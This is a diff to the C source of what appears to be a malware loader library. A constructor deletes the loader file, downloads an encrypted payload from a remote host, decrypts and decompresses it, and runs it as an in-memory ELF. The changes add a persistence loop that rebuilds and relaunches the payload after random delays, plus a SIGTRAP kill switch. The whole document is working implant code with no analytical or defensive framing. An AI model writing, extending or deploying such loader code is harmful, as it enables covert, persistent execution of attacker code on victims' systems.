@@ -12,9 +12,11 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
+#include <sys/random.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
 
 /* Configurable Options */
@@ -38,6 +40,74 @@
 #else
 #define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
 #endif
+
+// forward declarations
+size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
+                    const uint8_t *iv);
+
+static volatile sig_atomic_t g_trap_requested = 0;
+
+static void sigtrap_handler(int signo) {
+  (void)signo;
+  g_trap_requested = 1;
+}
+
+static uint32_t rand_u32(void) {
+  uint32_t v = 0;
+  ssize_t n = getrandom(&v, sizeof(v), 0);
+  if (n != (ssize_t)sizeof(v)) {
+    v = (uint32_t)time(NULL) ^ (uint32_t)getpid();
+  }
+  return v;
+}
+
+static int rand_range(int min, int max) {
+  uint32_t v = rand_u32();
+  return min + (v % (uint32_t)(max - min + 1));
+}
+
+// build a runnable payload by decrypting and decompressing the stored blob
+static int build_payload_from_encrypted(const char *enc_buf, size_t enc_size,
+                                        const uint8_t *key, char **out_buf,
+                                        size_t *out_size) {
+  if (!enc_buf || enc_size <= 16 || !out_buf || !out_size)
+    return -1;
+
+  uint8_t iv[16];
+  memcpy(iv, enc_buf, 16);
+  size_t encrypted_body = enc_size - 16;
+
+  char *cipher = malloc(encrypted_body);
+  if (!cipher)
+    return -1;
+  memcpy(cipher, enc_buf + 16, encrypted_body);
+  decrypt_data(cipher, encrypted_body, key, iv);
+
+  unsigned int decomp_size = (unsigned int)encrypted_body * 10;
+  char *decomp = NULL;
+  int res = TINF_OK;
+  for (int attempt = 0; attempt < 3; attempt++) {
+    decomp = calloc(decomp_size, sizeof(char));
+    if (!decomp) {
+      free(cipher);
+      return -1;
+    }
+    res = tinf_uncompress(decomp, &decomp_size, cipher, encrypted_body);
+    if (res == TINF_OK)
+      break;
+    free(decomp);
+    decomp = NULL;
+    decomp_size *= 2; // try a larger buffer
+  }
+
+  free(cipher);
+  if (res != TINF_OK || !decomp)
+    return -1;
+
+  *out_buf = decomp;
+  *out_size = decomp_size;
+  return 0;
+}
 
 /**
  * Decrypts data using the AES-128-CTR algorithm.
@@ -261,8 +331,13 @@ void main() {
 void __attribute__((constructor)) initLibrary(void) {
   unlink_loader();
 #endif
-  // ignore SIGCHLD
-  signal(SIGCHLD, SIG_IGN);
+  // handle SIGCHLD ourselves so we can monitor child status
+  signal(SIGCHLD, SIG_DFL);
+
+  struct sigaction trap_sa = {0};
+  trap_sa.sa_handler = sigtrap_handler;
+  sigemptyset(&trap_sa.sa_mask);
+  sigaction(SIGTRAP, &trap_sa, NULL);
 
   // prevent self delete of agent
   // see cmd/agent/main.go
@@ -277,68 +352,14 @@ void __attribute__((constructor)) initLibrary(void) {
   const char *key_str = DOWNLOAD_KEY;
   uint8_t key[16];
   derive_key_from_string(key_str, key);
-  char *buf = NULL;
-  size_t data_size = download_file(host, port, path, key, &buf);
-  if (data_size == 0) {
+  char *enc_buf = NULL;
+  size_t enc_size = download_file(host, port, path, key, &enc_buf);
+  if (enc_size == 0) {
     return;
   }
 
-  // Extract IV from the beginning of the buffer
-  uint8_t iv[16];
-  memcpy(iv, buf, 16);
-  DEBUG_PRINT("IV: %02x%02x%02x%02x%02x%02x%02x%02x"
-              "%02x%02x%02x%02x%02x%02x%02x%02x\n",
-              iv[0], iv[1], iv[2], iv[3], iv[4], iv[5], iv[6], iv[7], iv[8],
-              iv[9], iv[10], iv[11], iv[12], iv[13], iv[14], iv[15]);
-
-  // Decrypt the downloaded data
-  DEBUG_PRINT("Encrypted data size: %zu\n", data_size - 16);
-  size_t decrypted_size = decrypt_data(buf + 16, data_size - 16, key, iv);
-
-  // copy the decrypted data to a new buffer
-  char *decrypted_data = calloc(decrypted_size, sizeof(char));
-  if (!decrypted_data) {
-    perror("malloc");
-    free(buf);
-    return;
-  }
-  memcpy(decrypted_data, buf + 16, decrypted_size);
-
-#ifdef DEBUG
-  // Save the decrypted data to disk
-  FILE *file = fopen("/tmp/decrypted_data", "wb");
-  if (file) {
-    fwrite(buf + 16, 1, decrypted_size, file);
-    fclose(file);
-    DEBUG_PRINT("Decrypted data saved to /tmp/decrypted_data\n");
-  } else {
-    perror("fopen");
-  }
-#endif
-
-  // Decompress the decrypted data
-  unsigned int decompressed_size = decrypted_size * 10; // Adjust as needed
-  char *decompressed_buffer = calloc(decompressed_size, sizeof(char));
-  if (!decompressed_buffer) {
-    perror("malloc");
-    free(buf);
-    return;
-  }
-  DEBUG_PRINT("Allocated decompressed buffer of size: %u\n", decompressed_size);
-
-  int res = tinf_uncompress(decompressed_buffer, &decompressed_size,
-                            decrypted_data, decrypted_size);
-  free(buf);
-  if (res != TINF_OK) {
-    fprintf(stderr, "Decompression failed: %d\n", res);
-    free(decompressed_buffer);
-    return;
-  }
-
-  buf = decompressed_buffer;
-  data_size = decompressed_size;
-
-  DEBUG_PRINT("Decompressed data size: %zu\n", data_size);
+  // keep the encrypted payload for future restarts
+  DEBUG_PRINT("Encrypted payload stored: %zu bytes\n", enc_size);
 
   char *verbose = calloc(13, sizeof(char));
   snprintf(verbose, 13, "VERBOSE=%s", getenv("VERBOSE"));
@@ -355,12 +376,48 @@ void __attribute__((constructor)) initLibrary(void) {
 #endif
                   NULL};
 
-  pid_t child = fork();
-  // in child process
-  if (child == 0) {
-    // Run the ELF
-    DEBUG_PRINT("Running ELF...\n");
-    elf_run(buf, argv, envv); // Adjust the buffer pointer
+  while (1) {
+    g_trap_requested = 0;
+
+    char *payload = NULL;
+    size_t payload_size = 0;
+    if (build_payload_from_encrypted(enc_buf, enc_size, key, &payload,
+                                     &payload_size) != 0) {
+      DEBUG_PRINT("Failed to rebuild payload, exiting\n");
+      break;
+    }
+
+    pid_t child = fork();
+    if (child == 0) {
+      DEBUG_PRINT("Running ELF...\n");
+      elf_run(payload, argv, envv);
+      _exit(EXIT_FAILURE);
+    }
+
+    free(payload);
+
+    int status = 0;
+    while (1) {
+      pid_t res = waitpid(child, &status, WNOHANG);
+      if (res == child) {
+        DEBUG_PRINT("Child exited, status=%d\n", status);
+        break;
+      }
+
+      if (g_trap_requested) {
+        DEBUG_PRINT("Indicator offline trap received, killing child %d\n",
+                    child);
+        kill(child, SIGKILL);
+        waitpid(child, &status, 0);
+        break;
+      }
+
+      sleep(1);
+    }
+
+    int sleep_s = rand_range(180, 480); // at least a few minutes
+    DEBUG_PRINT("Sleeping %d seconds before restart\n", sleep_s);
+    sleep((unsigned int)sleep_s);
   }
 }
 
